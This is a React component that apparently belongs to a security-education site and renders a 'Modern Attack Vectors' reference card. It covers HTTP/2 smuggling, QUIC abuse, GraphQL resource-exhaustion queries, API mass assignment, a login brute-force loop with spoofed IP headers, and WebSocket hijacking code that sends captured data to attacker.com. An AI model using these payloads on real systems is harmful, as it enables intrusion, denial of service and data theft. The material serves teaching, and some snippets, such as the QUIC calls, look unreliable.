
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Globe } from 'lucide-react';

const ModernAttackVectors: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <div className="flex items-center gap-2">
          <Globe className="h-6 w-6 text-cybr-primary" />
          <CardTitle className="text-cybr-primary">Modern Attack Vectors</CardTitle>
        </div>
      </CardHeader>
      <CardContent className="space-y-6">
        {/* HTTP/2 & HTTP/3 Attacks */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">HTTP/2 & HTTP/3 Advanced Attacks</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">HTTP/2 Request Smuggling</h5>
            <p className="text-sm mb-3 opacity-80">
              Exploiting differences between HTTP/2 and HTTP/1.1 parsing in proxy chains.
            </p>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# HTTP/2 to HTTP/1.1 downgrade smuggling
# Send HTTP/2 request with conflicting headers

:method: POST
:path: /search
:authority: target.com
content-length: 35
transfer-encoding: chunked

search=innocent&x=
0

POST /admin HTTP/1.1
Host: target.com
Content-Length: 15

admin=true&x=

# HTTP/2 header injection
:method: GET
:path: /api/data
:authority: target.com
:scheme: https
foo bar: baz  # Space in header name - invalid in HTTP/1.1

# H2C smuggling (HTTP/2 over cleartext)
GET / HTTP/1.1
Host: target.com
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA

# Malicious HTTP/2 request follows...`}
            </pre>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">HTTP/3 QUIC Exploitation</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# QUIC connection manipulation
# Tool: quiche (Rust QUIC implementation)

# Stream confusion attack
# Open multiple streams with same ID
import quiche

config = quiche.Config(quiche.PROTOCOL_VERSION)
conn = quiche.connect("target.com", scid, config)

# Send multiple requests on same stream
conn.stream_send(0, b"GET /admin HTTP/3\r\n\r\n", False)
conn.stream_send(0, b"GET /user HTTP/3\r\n\r\n", True)

# 0-RTT replay attack
# Replay 0-RTT data to cause side effects
saved_early_data = conn.send_early_data()
# Later replay this data in new connection

# QUIC amplification attack
# Send small request, get large response
# UDP source IP spoofing for DDoS amplification`}
            </pre>
          </div>
        </div>

        {/* GraphQL Advanced Exploitation */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">GraphQL Advanced Exploitation</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">Query Complexity & Resource Exhaustion</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# Deeply nested query for DoS
query InfiniteRecursion {
  user(id: 1) {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  comments {
                    # Continue nesting...
                    content
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}

# Query batching abuse
[
  {"query": "query { user(id: 1) { name email posts { title content } } }"},
  {"query": "query { user(id: 2) { name email posts { title content } } }"},
  // Repeat 1000+ times to overwhelm server
]

# Alias-based multiplication
query AliasAbuse {
  user1: user(id: 1) { posts { title content comments { content author { name } } } }
  user2: user(id: 1) { posts { title content comments { content author { name } } } }
  user3: user(id: 1) { posts { title content comments { content author { name } } } }
  # Repeat with 1000+ aliases
}

# Field duplication attack
query FieldDuplication {
  user(id: 1) {
    name name name name name  # Repeat field 1000+ times
    email email email email
    posts { title title title }
  }
}`}
            </pre>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">Schema Introspection Abuse</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# Full schema extraction
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

# Enumerate hidden/debug fields
query DiscoverFields {
  __type(name: "User") {
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}`}
            </pre>
          </div>
        </div>

        {/* API Security Exploitation */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">API Security Advanced Exploitation</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">REST API Mass Assignment & Parameter Pollution</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# Mass assignment attack
POST /api/users HTTP/1.1
Content-Type: application/json

{
  "name": "John Doe",
  "email": "john@example.com",
  "role": "admin",           # Unexpected parameter
  "isActive": true,          # Hidden parameter
  "permissions": ["*"],      # Privilege escalation
  "_id": "custom_id",        # ID manipulation
  "__v": 0,                  # Version control bypass
  "password": "plaintext"    # Direct password setting
}

# HTTP Parameter Pollution (HPP)
GET /api/users?id=1&id=2 HTTP/1.1
# Different servers parse differently:
# PHP: id = "2" (last wins)
# ASP.NET: id = "1,2" (comma-separated)
# Python: id = ["1", "2"] (array)

# Method override attacks
POST /api/users/123 HTTP/1.1
X-HTTP-Method-Override: DELETE
X-Method-Override: PUT
_method=PATCH

# Content-Type confusion
POST /api/data HTTP/1.1
Content-Type: application/xml

{"json": "data"}  # Send JSON with XML content-type`}
            </pre>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">Rate Limiting & Throttling Bypasses</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`# IP-based bypass techniques
X-Forwarded-For: 127.0.0.1
X-Real-IP: 192.168.1.1
X-Originating-IP: 10.0.0.1
X-Remote-IP: 172.16.0.1
Client-IP: 203.0.113.1

# Rotate through headers
import requests
import random

headers_list = [
    {"X-Forwarded-For": f"192.168.1.{random.randint(1,254)}"},
    {"X-Real-IP": f"10.0.0.{random.randint(1,254)}"},
    {"CF-Connecting-IP": f"172.16.0.{random.randint(1,254)}"},
]

for i in range(1000):
    headers = random.choice(headers_list)
    response = requests.post("/api/login", headers=headers, json={"user": "admin", "pass": f"pass{i}"})

# User-Agent rotation
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

# Distributed rate limiting bypass
# Use multiple source IPs/proxies
proxies = ["proxy1:8080", "proxy2:8080", "proxy3:8080"]
for proxy in proxies:
    requests.post("/api/endpoint", proxies={"http": proxy})

# Case sensitivity bypass
POST /Api/Users vs POST /api/users
POST /API/USERS vs POST /api/Users`}
            </pre>
          </div>
        </div>

        {/* WebSocket Exploitation */}
        <div className="space-y-4">
          <h4 className="text-lg font-semibold text-cybr-accent">WebSocket Advanced Exploitation</h4>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="font-semibold mb-3 text-cybr-primary">WebSocket Hijacking & Message Injection</h5>
            <pre className="bg-black/50 p-3 rounded text-sm text-green-400 overflow-x-auto">
{`// Cross-Site WebSocket Hijacking (CSWSH)
// Malicious page connects to victim's WebSocket
var ws = new WebSocket("wss://victim.com/socket");
ws.onopen = function() {
    // Send malicious messages
    ws.send(JSON.stringify({
        "type": "admin_command",
        "action": "delete_user",  
        "target": "user123"
    }));
};

ws.onmessage = function(event) {
    // Exfiltrate received data
    fetch("//attacker.com/log", {
        method: "POST",
        body: event.data
    });
};

// Protocol confusion attack
// Mix WebSocket and HTTP protocols
ws.send("GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n");

// Message flooding DoS
setInterval(function() {
    for(let i = 0; i < 1000; i++) {
        ws.send("A".repeat(65536)); // Send large messages
    }
}, 100);

// Binary message exploitation
// Send binary data to trigger parsing errors
var binaryData = new Uint8Array([0xFF, 0xFE, 0xFD, 0xFC]);
ws.send(binaryData.buffer);

// Subprotocol confusion
var ws1 = new WebSocket("wss://target.com/socket", "chat");
var ws2 = new WebSocket("wss://target.com/socket", "admin");
// Different handlers might have different security controls`}
            </pre>
          </div>
        </div>
      </CardContent>
    </Card>
  );
};

export default ModernAttackVectors;
